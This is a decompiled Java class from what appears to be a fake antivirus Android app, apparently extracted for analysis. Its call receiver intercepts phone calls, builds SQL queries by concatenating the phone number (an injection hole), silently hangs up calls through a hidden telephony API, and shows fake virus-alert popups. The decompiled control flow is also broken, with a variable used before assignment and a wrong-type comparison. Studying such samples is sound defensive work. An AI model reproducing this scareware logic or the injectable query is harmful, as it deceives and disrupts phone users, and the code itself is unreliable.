package com.worker.androiddefender2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import com.android.internal.telephony.ITelephony;
import com.example.androiddefender2.DefenderApplication;
import com.example.androiddefender2.VirusInfoDialogActivity;
import java.lang.reflect.Method;
import system.AppSingleton;

public class CallReceiver extends BroadcastReceiver {
  protected AppSingleton as;
  
  private String phoneNumber = "";
  
  private ITelephony telephonyService;
  
  public void onReceive(Context paramContext, Intent paramIntent) {
    Intent intent;
    DefenderApplication.getInstance();
    boolean bool = paramContext.getSharedPreferences(DefenderApplication.APP_PREF, 0).getBoolean("chkMessages", false);
    if (paramIntent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
      this.phoneNumber = paramIntent.getExtras().getString("android.intent.extra.PHONE_NUMBER");
      this.as = AppSingleton.getInstance();
      this.as.getDB(paramContext.getApplicationContext());
      String str = "SELECT * FROM black_list WHERE call='true' AND number = '" + SystemFunctions.prepareNumber(this.phoneNumber) + "'";
      if (this.as.mainDB.getOneScanSettingsRow(str) != null)
        (new SystemFunctions()).generateNotification(paramContext, paramContext.getResources().getString(2131099744), String.format(paramContext.getResources().getString(2131099745), new Object[] { this.phoneNumber })); 
      if ((DefenderApplication.getInstance()).virusesDefine && bool && (DefenderApplication.getInstance()).indexesVr.size() > 0) {
        DefenderApplication.getInstance();
        if (!DefenderApplication.isCurAutoScan) {
          intent = new Intent(paramContext, VirusInfoDialogActivity.class);
          intent.addFlags(268435456);
          intent.putExtra("typePopup", 2);
          intent.putExtra("virusName", this.phoneNumber);
          paramContext.startActivity(intent);
        } 
      } 
      return;
    } 
    if (intent.getAction().equals("android.intent.action.PHONE_STATE")) {
      Method method;
      String str = intent.getStringExtra("state");
      if (str.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
        this.phoneNumber = intent.getStringExtra("incoming_number");
        this.as = AppSingleton.getInstance();
        this.as.getDB(paramContext.getApplicationContext());
        String str1 = "SELECT * FROM black_list WHERE call='true' AND number = '" + SystemFunctions.prepareNumber(this.phoneNumber) + "'";
        if (this.as.mainDB.getOneScanSettingsRow(str1) != null) {
          (new SystemFunctions()).generateNotification(paramContext, paramContext.getResources().getString(2131099742), String.format(paramContext.getResources().getString(2131099743), new Object[] { this.phoneNumber }));
          TelephonyManager telephonyManager = (TelephonyManager)paramContext.getSystemService("phone");
          try {
            method = Class.forName(telephonyManager.getClass().getName()).getDeclaredMethod("getITelephony", new Class[0]);
            method.setAccessible(true);
            this.telephonyService = (ITelephony)method.invoke(telephonyManager, new Object[0]);
            this.telephonyService.endCall();
          } catch (Exception exception) {
            exception.printStackTrace();
          } 
        } 
        if ((DefenderApplication.getInstance()).virusesDefine && bool && (DefenderApplication.getInstance()).indexesVr.size() > 0) {
          DefenderApplication.getInstance();
          if (!DefenderApplication.isCurAutoScan) {
            Intent intent1 = new Intent(paramContext, VirusInfoDialogActivity.class);
            intent1.addFlags(268435456);
            intent1.putExtra("typePopup", 2);
            intent1.putExtra("virusName", this.phoneNumber);
            paramContext.startActivity(intent1);
          } 
        } 
        return;
      } 
      if (method.equals(TelephonyManager.EXTRA_STATE_OFFHOOK) || method.equals(TelephonyManager.EXTRA_STATE_IDLE));
    } 
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/worker/androiddefender2/CallReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */